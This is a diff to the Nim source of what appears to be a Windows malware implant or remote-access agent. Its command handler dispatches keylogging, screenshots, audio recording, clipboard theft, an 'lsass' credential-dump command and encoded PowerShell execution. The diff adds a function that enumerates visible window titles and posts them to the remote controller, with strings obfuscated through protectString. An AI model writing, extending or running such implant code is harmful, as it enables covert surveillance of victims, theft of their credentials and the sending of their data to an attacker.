@@ -4,8 +4,8 @@ import ../common
 import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger, mutex]
 # Internal imports
 import std/[tables, nativesockets, json]
+import wAuto/[registry, window]
 import winim/[lean, com]
-import wAuto/[registry]
 import system/[io]
 import httpclient
 import threadpool
@@ -25,6 +25,7 @@ proc collect_data(): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
+proc enum_visible_windows(): bool
 proc wrap_get_screenshot(): bool
 proc wrap_record_audio(record_time: int): bool
 proc wrap_keylog_start(): bool
@@ -183,6 +184,30 @@ proc wrap_get_clipboard(): bool =
 
     return is_success
 
+
+proc enum_visible_windows(): bool =   
+    
+    var is_success: bool
+    var windows = ""
+
+    try:
+        for i in windows():
+            if i.isVisible() and i.getTitle().len() > 1:
+                windows.add("[" & i.getTitle() & "]\n")
+        is_success = true
+    except:
+        is_success = false
+        windows = ""
+    
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("windows"): windows
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("windows") , $data)
+
+    return is_success
+      
 
 proc wrap_get_screenshot(): bool =
     var screenshot_stream: string
@@ -598,6 +623,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = wrap_get_clipboard()
         of protectString("screenshot"):
             is_success = wrap_get_screenshot()
+        of protectString("windows"):
+            is_success = enum_visible_windows()
         of protectString("audio"):
             is_success = wrap_record_audio(command[protectString("record_time")].getInt())
         of protectString("lsass"):
